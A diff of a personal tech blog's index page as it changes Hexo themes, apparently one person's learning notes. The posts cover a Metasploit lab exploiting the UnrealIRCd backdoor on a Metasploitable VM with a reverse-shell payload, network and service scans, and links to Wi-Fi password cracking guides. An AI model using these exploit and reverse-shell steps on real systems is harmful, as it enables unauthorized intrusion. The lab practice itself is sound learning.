@@ -1,308 +1,187 @@
 <!DOCTYPE html>
+<html lang="en">
 
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="en">
+<!-- Head tag -->
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
 
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
+    <!--Description-->
+    
+        <meta name="description" content="My Tech Notes and Other stuff">
+    
 
+    <!--Author-->
+    
+        <meta name="author" content="Ray Qu">
+    
 
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="My Notes"/>
+    
 
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="My Tech Notes and Other stuff" />
+    
 
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="My Notes"/>
 
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
 
+    <!--Page Cover-->
+    
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="twitter:card" content="summary" />
+    
 
+    <!-- Title -->
+    
+    <title>My Notes</title>
 
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
 
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
 
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
 
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
 
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="My Tech Notes and Other stuff">
-<meta property="og:type" content="website">
-<meta property="og:title" content="My Notes">
-<meta property="og:url" content="https://aaray6.github.io/index.html">
-<meta property="og:site_name" content="My Notes">
-<meta property="og:description" content="My Tech Notes and Other stuff">
-<meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="My Notes">
-<meta name="twitter:description" content="My Tech Notes and Other stuff">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="https://aaray6.github.io/"/>
-
-
-
-
-
-  <title>My Notes</title>
-  
-
-
-
-
-
-
+    <!-- Google Analytics -->
+    
 
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
 
-  
-  
-    
-  
+<body>
 
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">My Notes</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
     </div>
-      
-        <p class="site-subtitle">I love games</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
 </div>
 
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
 </nav>
 
+<div class="container">
 
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
 
- </div>
-    </header>
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">My Notes</h1>
+        
+    </div>
+</header>
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
+        <section class="main">
             
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2019/02/27/metasploit/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/02/27/metasploit/" itemprop="url">metasploit</a></h1>
-        
+<div class="post">
 
-        <div class="post-meta">
-          <span class="post-time">
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/03/04/hexo-theme-AlphaDust/">
+                hexo_theme_AlphaDust
+            </a>
+        </h1>
+        <div class="post-info">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-27T14:25:12+08:00">
-                2019-02-27
-              </time>
+                <span class="date">2019-03-04</span>
             
-
             
-
             
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+    </div>
 
     
+        <div class="content">
+            <p>Use <a href="https://github.com/klugjo/hexo-theme-alpha-dust" target="_blank" rel="noopener">AlphaDust</a> theme</p>
+<p>themes/alpha-dust/_config.yml</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Logo (Font Awesome Class)</span></span><br><span class="line"><span class="attr">fa_logo:</span> <span class="string">fa-cube</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Header</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line"><span class="attr">  Home:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">  Archives:</span> <span class="string">/archives</span></span><br><span class="line"><span class="attr">  About:</span> <span class="string">/about.html</span></span><br><span class="line"><span class="comment">#  Tags: /tags</span></span><br><span class="line"><span class="comment">#  Categories: /categories</span></span><br><span class="line"><span class="attr">  Contact:</span> <span class="string">/contact.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Default post title</span></span><br><span class="line"><span class="attr">default_post_title:</span> <span class="string">mynote</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Archive Date Format</span></span><br><span class="line"><span class="attr">archive_date_format:</span> <span class="string">MMM</span> <span class="string">YYYY</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Comments.</span></span><br><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Disqus comments</span></span><br><span class="line"><span class="attr">  disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Analytics Tracking ID</span></span><br><span class="line"><span class="attr">google_analytics:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Accounts</span></span><br><span class="line"><span class="comment">#twitter_url: https://twitter.com/?lang=en</span></span><br><span class="line"><span class="comment">#facebook_url: https://www.facebook.com/</span></span><br><span class="line"><span class="comment">#instagram_url: https://www.instagram.com/</span></span><br><span class="line"><span class="comment">#dribble_url: https://dribbble.com/</span></span><br><span class="line"><span class="attr">github_url:</span> <span class="attr">https://github.com/aaray6</span></span><br><span class="line"><span class="comment">#googleplus_url: https://plus.google.com/</span></span><br><span class="line"><span class="comment">#behance_url: https://www.behance.net/</span></span><br><span class="line"><span class="comment">#fivehundredpx_url: https://500px.com/</span></span><br><span class="line"><span class="attr">email_url:</span> <span class="string">aaray@21cn.com</span></span><br><span class="line"><span class="comment">#rss_url: \#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer About Text</span></span><br><span class="line"><span class="attr">footer_about:</span> <span class="string">"&lt;a href=\"about.html\"&gt;I love games&lt;/a&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer Copyright Line</span></span><br><span class="line"><span class="attr">footer_copyright:</span> <span class="string">"Copyleft"</span></span><br></pre></td></tr></table></figure>
+        </div>
     
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/27/metasploit/">
+                metasploit
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-27</span>
+            
+            
+            
+        </div>
+    </div>
+
     
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
+        <div class="content">
             <h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><ul>
 <li>测试用的被攻击Linux虚拟机镜像下载</li>
 </ul>
@@ -316,9 +195,34 @@
 <ul>
 <li>IRC on Metasploitable</li>
 </ul>
-<p>Kali Linux: 192.168.56.102<br>Metasploitable: 192.168.56.101</p>
-<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search Unreal 3.2.1.8</span><br><span class="line">use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">show payloads</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">show options</span><br><span class="line">set LHOST 192.168.56.102</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>Kali Linux: 192.168.56.100<br>Metasploitable: 192.168.56.101</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search Unreal 3.2.1.8</span><br><span class="line">use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">show payloads</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">show options</span><br><span class="line">set LHOST 192.168.56.100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>Can connect to 192.168.56.101 with root account</p>
+<ul>
+<li>Modules</li>
+</ul>
+<blockquote>
+<p><a href="https://www.bilibili.com/video/av16925201" target="_blank" rel="noopener">Metasploit系列教程第一季</a></p>
+</blockquote>
+<ol>
+<li>Port scan</li>
+</ol>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nmap -v -sV 192.168.56.101</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<ol>
+<li>SMB scan for windows system information</li>
+</ol>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search smb_version</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<ol>
+<li>服务识别</li>
+</ol>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ssh_version</span><br><span class="line">use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">set RHOSTS 192.168.56.101</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search ftp_version</span><br><span class="line">use auxiliary/scanner/ftp/ftp_version</span><br></pre></td></tr></table></figure>
+<ol>
+<li>Sniffer</li>
+</ol>
+<p>auxiliary/sniffer/psnuffle</p>
+<p>TODO</p>
 <ul>
 <li>测试用的被攻击Windows 2008</li>
 </ul>
@@ -331,124 +235,31 @@
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vagrant up</span></span><br><span class="line">Bringing machine 'win2k8' up with 'virtualbox' provider...</span><br><span class="line">==&gt; win2k8: Checking if box 'rapid7/metasploitable3-win2k8' version '0.1.0-weekly' is up to date...</span><br><span class="line">==&gt; win2k8: Clearing any previously set forwarded ports...</span><br><span class="line">==&gt; win2k8: Clearing any previously set network interfaces...</span><br><span class="line">==&gt; win2k8: Preparing network interfaces based on configuration...</span><br><span class="line">    win2k8: Adapter 1: nat</span><br><span class="line">    win2k8: Adapter 2: hostonly</span><br><span class="line">==&gt; win2k8: Forwarding ports...</span><br><span class="line">    win2k8: 3389 (guest) =&gt; 3389 (host) (adapter 1)</span><br><span class="line">    win2k8: 22 (guest) =&gt; 2222 (host) (adapter 1)</span><br><span class="line">    win2k8: 5985 (guest) =&gt; 55985 (host) (adapter 1)</span><br><span class="line">    win2k8: 5986 (guest) =&gt; 55986 (host) (adapter 1)</span><br><span class="line">==&gt; win2k8: Running 'pre-boot' VM customizations...</span><br><span class="line">==&gt; win2k8: Booting VM...</span><br><span class="line">==&gt; win2k8: Waiting for machine to boot. This may take a few minutes...</span><br><span class="line">    win2k8: WinRM address: 127.0.0.1:55985</span><br><span class="line">    win2k8: WinRM username: vagrant</span><br><span class="line">    win2k8: WinRM execution_time_limit: PT2H</span><br><span class="line">    win2k8: WinRM transport: negotiate</span><br><span class="line">==&gt; win2k8: Machine booted and ready!</span><br><span class="line">==&gt; win2k8: Checking for guest additions in VM...</span><br><span class="line">    win2k8: The guest additions on this VM do not match the installed version of</span><br><span class="line">    win2k8: VirtualBox! In most cases this is fine, but in rare cases it can</span><br><span class="line">    win2k8: prevent things such as shared folders from working properly. If you see</span><br><span class="line">    win2k8: shared folder errors, please make sure the guest additions within the</span><br><span class="line">    win2k8: virtual machine match the version of VirtualBox you have installed on</span><br><span class="line">    win2k8: your host and reload your VM.</span><br><span class="line">    win2k8: </span><br><span class="line">    win2k8: Guest Additions Version: 5.2.8</span><br><span class="line">    win2k8: VirtualBox Version: 6.0</span><br><span class="line">==&gt; win2k8: Setting hostname...</span><br><span class="line">==&gt; win2k8: Configuring and enabling network interfaces...</span><br><span class="line">==&gt; win2k8: Machine already provisioned. Run `vagrant provision` or use the `--provision`</span><br><span class="line">==&gt; win2k8: flag to force provisioning. Provisioners marked to run always will still run.</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap 192.168.56.108</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2019-02-28 15:20 CST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">4848/tcp  open  appserv-http</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">8383/tcp  open  m2mservices</span><br><span class="line">9200/tcp  open  wap-wsp</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds</span><br></pre></td></tr></table></figure>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2019/02/27/ubuntu-ext-display/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/27/ubuntu-ext-display/" itemprop="url">ubuntu18.04双显示器</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-27T13:57:57+08:00">
-                2019-02-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/27/ubuntu-ext-display/">
+                ubuntu18.04双显示器
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-27</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="ubuntu18-04双显示器配置"><a href="#ubuntu18-04双显示器配置" class="headerlink" title="ubuntu18.04双显示器配置"></a>ubuntu18.04双显示器配置</h1><p>环境Thinkpad x201, ubuntu18.04, 外接显示器1920x1080, VGA接口</p>
 <blockquote>
 <p><a href="https://askubuntu.com/questions/138408/how-to-add-display-resolution-for-an-lcd-in-ubuntu-12-04-xrandr-problem" target="_blank" rel="noopener">how-to-add-display-resolution-for-an-lcd-in-ubuntu-12-04-xrandr-problem</a></p>
@@ -464,124 +275,31 @@
 <p>setup in UI</p>
 <p><img src="/myimages/ubuntu-ext-display-setup.png" alt="setup"></p>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2019/02/22/kali-usage/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/22/kali-usage/" itemprop="url">Kali Linux应用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-22T09:59:29+08:00">
-                2019-02-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/22/kali-usage/">
+                Kali Linux应用
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-22</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="Kali-Linux破解WPA-WPA2-Wifi密码"><a href="#Kali-Linux破解WPA-WPA2-Wifi密码" class="headerlink" title="Kali Linux破解WPA/WPA2 Wifi密码"></a>Kali Linux破解WPA/WPA2 Wifi密码</h1><blockquote>
 <p><a href="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/" target="_blank" rel="noopener">Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)</a><br><a href="http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html" target="_blank" rel="noopener">How To Hack WPA/WPA2 Wi-Fi With Kali Linux &amp; Aircrack-ng</a><br><a href="https://www.sunnyhoi.com/how-to-crack-wpawpa2-wi-fi-passwords-using-aircrack-ng-in-kali/" target="_blank" rel="noopener">How To Crack WPA/WPA2 Wi-Fi Passwords Using Aircrack-Ng In Kali</a></p>
 </blockquote>
@@ -601,124 +319,31 @@
 <li>netstat</li>
 </ul>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install net-tools</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2019/02/20/kali-linux/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/20/kali-linux/" itemprop="url">Kali linux</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-20T14:33:34+08:00">
-                2019-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/20/kali-linux/">
+                Kali linux
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-20</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="Kali-Linux-Notes"><a href="#Kali-Linux-Notes" class="headerlink" title="Kali Linux Notes"></a>Kali Linux Notes</h1><p>Install Kali Linux on VirtualBox. The host is ubuntu</p>
 <p>Set 1G memory and 2 CPUs.</p>
 <h2 id="MT7601U-Wireless-Adapter-in-Kali-in-VirtualBox"><a href="#MT7601U-Wireless-Adapter-in-Kali-in-VirtualBox" class="headerlink" title="MT7601U Wireless Adapter in Kali in VirtualBox"></a>MT7601U Wireless Adapter in Kali in VirtualBox</h2><p>MT7601U Wireless Adapter can be used in my host system. No need to do any setting. The ubuntu has driver already.</p>
@@ -766,124 +391,31 @@
 </blockquote>
 <p>Use following command to get current Virtualbox version</p>
